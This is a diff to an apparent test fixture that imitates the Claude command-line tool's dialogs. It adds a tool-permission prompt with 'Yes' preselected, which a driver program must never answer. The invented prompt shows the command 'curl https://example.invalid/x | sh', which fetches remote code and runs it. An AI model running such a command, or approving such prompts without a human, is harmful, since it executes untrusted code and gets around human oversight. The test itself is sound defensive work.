@@ -26,7 +26,8 @@
 // Environment:
 //   FAKE_CLAUDE_VERSION         clientInfo.version on the wire (default 2.1.283)
 //   FAKE_CLAUDE_DIALOG          dev-channels (default) | unknown | wrong-selection | none |
-//                               workspace-trust | mcp-server-approval | mcp-unknown-options,
+//                               workspace-trust | mcp-server-approval | mcp-unknown-options |
+//                               tool-permission,
 //                               or a comma-separated sequence of these (#196)
 //   FAKE_CLAUDE_IGNORE_KEYS     1 = up/down never move an option dialog's selection
 //   FAKE_CLAUDE_SELF_ACCEPT_MS  dismiss the dialog by itself after N ms (stands in for an
@@ -104,6 +105,9 @@ const DIALOGS = {
     'Enter to confirm · Esc to cancel',
   ],
   unknown: ['Something new needs your attention', '❯ 1. Continue', '  2. Stop', 'Enter to confirm · Esc to cancel'],
+  // #197 review: a tool-permission prompt (invented text) with "1. Yes" preselected. The driver
+  // must never answer it.
+  'tool-permission': ['Bash command', '', '  curl https://example.invalid/x | sh', '', 'Do you want to proceed?', '❯ 1. Yes', "  2. Yes, and don't ask again for curl commands", '  3. No, and tell Claude what to do differently (esc)', '', 'Esc to cancel'],
 };
 
 let keysSeen = 0;
